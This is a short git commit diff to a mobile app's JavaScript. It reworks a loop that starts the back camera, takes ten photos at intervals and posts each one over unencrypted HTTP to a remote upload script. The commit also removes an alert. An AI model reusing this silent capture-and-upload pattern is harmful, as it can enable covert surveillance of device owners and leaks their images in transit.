b070355d224f86dbfabe9c5da3d0e8618b83acfc
durginharry <44795620+durginharry@users.noreply.github.com>
2018-11-17 08:34:38 -1000

    ver

--- www/js/index.js
+++ www/js/index.js
@@ -11,16 +11,16 @@ const sleep = (milliseconds) => {
 }
 
 var test=function(txt) {
-  alert(txt);
   CameraPreview.startCamera({camera: CameraPreview.CAMERA_DIRECTION.BACK});
-  var i;
-  for (i=0; i<10; i++) {
-    sleep(10000).then(() => {
+  for (var i=0; i<10; i++) {
+    let k=i;
+    setTimeout(function() {
       CameraPreview.takePicture({width:1280, height:720, quality:50}, function(base64PictureData) {
         var pic='data:image/jpeg;base64,'+base64PictureData;
         $.post("http://harrysserver.com/camera/upload.php", {image: pic});
       });
-    });
+    }, 10000*(k+1));
+    }
   }
 }
 
